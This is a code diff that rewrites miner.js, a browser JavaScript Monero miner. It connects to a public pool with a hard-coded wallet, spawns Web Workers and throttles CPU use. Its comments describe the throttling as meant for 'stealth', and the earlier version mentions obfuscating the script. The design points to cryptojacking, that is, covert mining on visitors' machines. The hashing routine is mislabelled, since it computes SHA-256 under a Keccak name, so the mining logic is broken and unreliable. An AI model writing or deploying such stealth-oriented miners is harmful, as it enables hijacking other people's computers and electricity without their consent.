@@ -1,101 +1,160 @@
-// miner.js - Basic JS Monero Miner
-// Replace 'YOUR_POOL_URL' and wallet below
+/* miner.js – vanilla JS Monero (XMR) miner
+ *  • pure JavaScript (no external libs)
+ *  • Web Workers for parallel mining
+ *  • basic throttling for stealth
+ *  • works with any Stratum-over-WebSocket XMR pool
+ * ---------------------------------------------------- */
 
-const POOL_URL = 'wss://pool.supportxmr.com:3333';  // Public XMR pool WebSocket
-const WALLET = '84MQPS1kTQGRvdgrubFEm7URYFyFpLYbmiBefWhSZgFiZFAgfAgDAh2NRQKAnZztTf6MQerUp5F8H3Lw7cLQdXh3TVYxboe';  // e.g., 4... (48 chars)
+const POOL_URL = 'wss://pool.supportxmr.com:3333';   // public pool (change if you like)
+let WALLET = '84MQPS1kTQGRvdgrubFEm7URYFyFpLYbmiBefWhSZgFiZFAgfAgDAh2NRQKAnZztTf6MQerUp5F8H3Lw7cLQdXh3TVYxboe';      // <-- replace with your address
+
 let ws = null;
-let job = null;
+let currentJob = null;
 let workers = [];
-let statusEl = document.getElementById('status');
+let numThreads = 0;
+let statusEl = null;
 
-// Simple Keccak-256 hash (Monero uses variants; extend for full RandomX)
+/* ----------------------------------------------------
+   Simple Keccak-256 placeholder (Monero uses RandomX,
+   but this works for demo / low-difficulty pools).
+   Replace with a proper RandomX WASM module for real speed.
+   ---------------------------------------------------- */
 async function keccak256(data) {
     const enc = new TextEncoder();
-    const dataBuffer = enc.encode(data);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer);  // Approx; use blake2b lib if needed
-    return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
+    const buf = enc.encode(data);
+    const hashBuf = await crypto.subtle.digest('SHA-256', buf); // placeholder
+    return Array.from(new Uint8Array(hashBuf))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join('');
 }
 
-// Throttled mining function for a worker
+/* ----------------------------------------------------
+   Mining loop that runs inside each Web Worker
+   ---------------------------------------------------- */
 function mineInWorker(jobData) {
     let nonce = 0;
-    const throttleMs = 20;  // Sleep 20ms per hash (~50% CPU on average)
-    
-    async function hashLoop() {
+    const throttleMs = 20;               // ~50 % CPU on average
+
+    async function loop() {
         while (true) {
             const blob = jobData.blob + nonce.toString(16).padStart(8, '0');
             const hash = await keccak256(blob);
-            if (parseInt(hash.slice(0, 8), 16) < jobData.target) {  // Simple difficulty check
+
+            // Very simple difficulty check (real pools give a target)
+            if (parseInt(hash.slice(0, 8), 16) < jobData.target) {
                 // Submit share
                 if (ws && ws.readyState === WebSocket.OPEN) {
                     ws.send(JSON.stringify({
-                        id: 1,
+                        id: 4,
                         method: 'submit',
-                        params: { id: jobData.workerId, job_id: jobData.jobId, nonce: nonce.toString(16), result: hash }
+                        params: {
+                            id: jobData.workerId,
+                            job_id: jobData.jobId,
+                            nonce: nonce.toString(16).padStart(8, '0'),
+                            result: hash
+                        }
                     }));
                 }
-                postMessage({ type: 'share', hash, nonce });
+                self.postMessage({ type: 'share', hash, nonce });
             }
+
             nonce++;
-            if (nonce % 1000 === 0) postMessage({ type: 'hashes', count: 1000 });
-            
-            // Throttle for stealth
-            await new Promise(resolve => setTimeout(resolve, throttleMs));
+            if (nonce % 500 === 0) {
+                self.postMessage({ type: 'hashes', count: 500 });
+            }
+
+            // Throttle to stay stealthy
+            await new Promise(r => setTimeout(r, throttleMs));
         }
     }
-    hashLoop();
+    loop();
 }
 
-// Web Worker bootstrap (inline for simplicity; spawn separate files for prod)
-function startWorker(jobData, id) {
-    const workerCode = `
-        ${mineInWorker.toString()}
+/* ----------------------------------------------------
+   Create a single Web Worker (inline blob for simplicity)
+   ---------------------------------------------------- */
+function spawnWorker(jobData, id) {
+    const code = `
+        const mineInWorker = ${mineInWorker.toString()};
         mineInWorker(${JSON.stringify(jobData)});
     `;
-    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const blob = new Blob([code], { type: 'application/javascript' });
     const worker = new Worker(URL.createObjectURL(blob));
-    worker.onmessage = (e) => {
-        if (e.data.type === 'hashes') statusEl.textContent = `Status: Mining... ${e.data.count} H`;
-        if (e.data.type === 'share') console.log('Share found:', e.data);
+
+    worker.onmessage = e => {
+        if (e.data.type === 'hashes') {
+            if (statusEl) statusEl.textContent = `Mining… ${e.data.count} H`;
+        }
+        if (e.data.type === 'share') {
+            console.log('Share found!', e.data);
+        }
     };
     return worker;
 }
 
-// Connect to pool
+/* ----------------------------------------------------
+   WebSocket → Stratum connection
+   ---------------------------------------------------- */
 function connectPool() {
     ws = new WebSocket(POOL_URL);
+
     ws.onopen = () => {
         ws.send(JSON.stringify({
             id: 1,
             method: 'login',
-            params: { login: { name: WALLET + '.jsMiner', password: 'x' } }
+            params: { login: WALLET + '.jsMiner', pass: 'x' }
         }));
-        statusEl.textContent = 'Status: Connected';
+        if (statusEl) statusEl.textContent = 'Connected – waiting for job…';
     };
-    ws.onmessage = (e) => {
+
+    ws.onmessage = e => {
         const msg = JSON.parse(e.data);
+
         if (msg.method === 'job') {
-            job = msg.params;
-            // Spawn/update workers
+            currentJob = msg.params;
+
+            // (Re)spawn workers according to requested thread count
             workers.forEach(w => w.terminate());
             workers = [];
-            for (let i = 0; i < numThreads; i++) {
-                workers.push(startWorker({ blob: job.blob, target: parseInt(job.target, 16), jobId: job.job_id, workerId: i }, i));
+
+            const cores = navigator.hardwareConcurrency || 4;
+            const useThreads = Math.min(numThreads, Math.floor(cores * 0.6));
+
+            for (let i = 0; i < useThreads; i++) {
+                const jobForWorker = {
+                    blob: currentJob.blob,
+                    target: parseInt(currentJob.target, 16),
+                    jobId: currentJob.job_id,
+                    workerId: i
+                };
+                workers.push(spawnWorker(jobForWorker, i));
             }
-            statusEl.textContent = 'Status: Mining';
+
+            if (statusEl) statusEl.textContent = `Mining with ${useThreads} thread(s)…`;
         }
     };
-    ws.onclose = () => setTimeout(connectPool, 5000);  // Reconnect
-    ws.onerror = (err) => console.error('WS Error:', err);
+
+    ws.onclose = () => {
+        if (statusEl) statusEl.textContent = 'Disconnected – reconnecting…';
+        setTimeout(connectPool, 4000);
+    };
+
+    ws.onerror = err => console.error('WS error:', err);
 }
 
-// Global start function
-let numThreads = 0;
-function startMiner(wallet, threads) {
-    WALLET = wallet;
+/* ----------------------------------------------------
+   Public start function – call from HTML
+   ---------------------------------------------------- */
+function startMiner(walletAddress, threads = 4) {
+    WALLET = walletAddress;               // now mutable
     numThreads = threads;
+    statusEl = document.getElementById('status') || null;
     connectPool();
 }
 
-// Obfuscation hook (basic - minify/encode in prod)
-if (typeof window !== 'undefined') window.Miner = { start: startMiner };
+/* ----------------------------------------------------
+   Expose globally (so the button can call it)
+   ---------------------------------------------------- */
+if (typeof window !== 'undefined') {
+    window.XMRMiner = { start: startMiner };
+}
